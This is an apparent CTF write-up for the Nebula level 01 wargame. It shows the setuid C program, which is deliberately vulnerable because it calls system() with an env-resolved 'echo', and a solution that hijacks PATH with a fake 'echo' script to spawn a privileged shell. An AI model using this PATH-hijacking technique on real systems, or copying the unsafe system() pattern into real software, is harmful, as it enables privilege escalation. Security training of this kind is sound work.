.. _nebula01:

.. role:: bash(code)
	  :language: bash
.. role:: c(code)
	  :language: c
		     
Nebula level 01
===============

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level01/

**Source Code**

.. code-block:: c
		#include <stdlib.h>
		#include <unistd.h>
		#include <string.h>
		#include <sys/types.h>
		#include <stdio.h>

		int main(int argc, char **argv, char **envp)
		{
		    gid_t gid;
		    uid_t uid;
		    gid = getegid();
		    uid = geteuid();

		    setresgid(gid, gid, gid);
		    setresuid(uid, uid, uid);

		    system("/usr/bin/env echo and now what?");
		}

Solution
--------

Export :bash:`PATH` first

:bash:`$ export PATH=/tmp:$PATH`

On :bash:`tmp` create a bash script with this and name it echo (without extension):

.. code-block:: bash
		#!/bin/bash
		bash

:bash:`$ chmod 777 echo`

and last execute

:bash:`getflag` 

